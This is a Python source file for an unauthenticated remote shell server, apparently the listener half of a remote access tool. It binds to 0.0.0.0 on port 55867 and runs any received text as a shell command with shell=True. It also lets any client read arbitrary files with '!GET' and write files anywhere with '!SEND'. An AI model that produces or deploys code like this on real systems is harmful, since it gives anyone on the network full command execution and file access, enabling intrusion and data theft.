import socket
import subprocess
import os.path
import time
from command import Command


class Server:

    def __init__(self, server_port):
        """Class constructor."""

        self.address = '0.0.0.0', server_port

        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        try:
            self.socket.bind(self.address)
            self.socket.listen(1)
            self.on = True
            self.client_on = False

        except:
            pass

    def _get_connection(self):
        self.client, self.client_address = self.socket.accept()
        self.client_on = True

    def send(self, data):
        self.client.send(str(data))

    def recv(self, buffersize):
        return self.client.recv(buffersize)

    def recvall(self, size):

        buf = ''
        while size:
            data = self.client.recv(4096)
            buf += data
            size -= len(data)
        return buf

    def close_client(self):
        self.client.close()

    def close(self):
        self.socket.close()
        self.on = False


class SpecialServer(Server):
    
    def __init__(self):
        """Class constructor."""

        Server.__init__(self, 55867)
        
    def exec_shell_command(self, c):
        """Execute a command in the server\'s shell. Sends to self.client the output of the executed command."""
        
        child = subprocess.Popen(c.command, shell=True,
                                 stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        
        time.sleep(1.25)
        
        if child.poll() is None:
            child.kill()
            self.send(len('[-] Process timed out.'))
            self.send('[-] Process timed out.')
        else:        
            child_stdout, child_stderr = child.stdout.read(), child.stderr.read()
            output = child_stdout + '\n' + child_stderr
            self.send(len(output))
            self.send(output)

    @staticmethod
    def check_get(getc):
        """validate the file that is being sent."""

        path = getc.get_path()
        rcode = ''
        if os.path.exists(path):
            if os.path.isfile(path):
                rcode = '0'
            else:
                rcode = '1'
        else:
            rcode = '2'
        return rcode

    @staticmethod
    def write_to_file(content, dst, filename):
        """Write content to dst\\filename."""
    
        with open(dst + '\\' + filename, 'wb') as f: f.write(content)

    @staticmethod
    def read_from_file(path):
        """Read content of path."""

        with open(path, 'rb') as f:
            return f.read()

    def get_cmd(self, c):
        """Handle '!GET' command."""

        rcode = self.check_get(c)
        self.send(rcode)
        if rcode == '0':
            file_to_send = self.read_from_file(c.get_path())
            self.send(len(file_to_send))
            self.send(file_to_send)

    def send_cmd(self, c):
        """Handle '!SEND' command."""

        if os.path.exists(c.get_destination()):
            server_rcode = '0'
        else:
            server_rcode = '1'
        self.send(server_rcode)

        if server_rcode == '0':
            size = int(self.recv(4096))
            self.write_to_file(self.recvall(size), c.get_destination(), c.get_filename())
            self.send('0')

    def exit_close_cmd(self, c):
        """Handle '!EXIT' or '!CLOSE' command."""

        self.client.close()
        self.client_on = False

        if c.type == '!CLOSE':
            self.close()
            self.on = False

    def server_handler(self):
        """Handles commands and connections."""

        try:

            if not self.client_on:
                self._get_connection()

            c = Command(self.recv(4096))

            if c.type in ['!CLOSE', '!EXIT']:
                self.exit_close_cmd(c)

            elif c.type == '!GET':
                self.get_cmd(c)

            elif c.type == '!SEND':
                self.send_cmd(c)

            else:
                self.exec_shell_command(c)

        except:
            self.client.close()
            self.client_on = False
